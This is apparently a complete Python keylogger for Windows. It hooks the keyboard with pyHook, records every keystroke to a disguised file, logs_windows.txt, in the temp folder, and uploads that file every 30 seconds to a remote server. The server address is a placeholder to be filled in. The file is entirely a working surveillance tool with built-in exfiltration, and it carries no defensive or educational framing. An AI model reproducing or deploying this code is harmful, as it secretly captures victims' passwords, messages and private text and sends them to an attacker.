import pythoncom, pyHook, requests
import tempfile
import threading
import time

def keyPressed(event):

	global store
	mappings = {8: "<backspace>", 13: "\n", 27: "<esc>", 32: " ", 46: "<del>", 91: "<win>",
                160: "<shft>", 162: "<ctrl>", 163: "<r-ctrl>", 164: "<alt>", 165: "<ralt>", 9: "<tab>",
                48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
                37: "←", 38: "↑", 39: "→", 40: "↓",
                192: "ö", 222: "ä", 186: "ü", 187: "+", 191: "#",
                188: ",", 190: ".", 189: "-", 219: "ß", 221: "´", 107: "+", 109: "-", 111: "/", 106: "*"
                }

	try:
		id = event.KeyID
		
		if not id in mappings:
			char = chr(id).lower()
		else:
			char = mappings.get(id)

		store = store + char
		fp = open(tempfile.gettempdir()+'\\logs_windows.txt','w+')
		print(char,end='')
		fp.write(store)
		fp.close()
		

	except Exception as e:
		print(str(e))

	return True

def uploadFile():

	while True:
		time.sleep(30)
		try:
			url = 'https://your_server_address/python_file.php'
			files = {'file': open(tempfile.gettempdir()+'\\logs_windows.txt', 'rb')}
			r = requests.post(url, files=files)
			print(str(r.text))
		except:
			pass
		

store = ''

t1 = threading.Thread(target=uploadFile)
t1.start()

obj = pyHook.HookManager()

obj.KeyDown = keyPressed

obj.HookKeyboard()

pythoncom.PumpMessages()
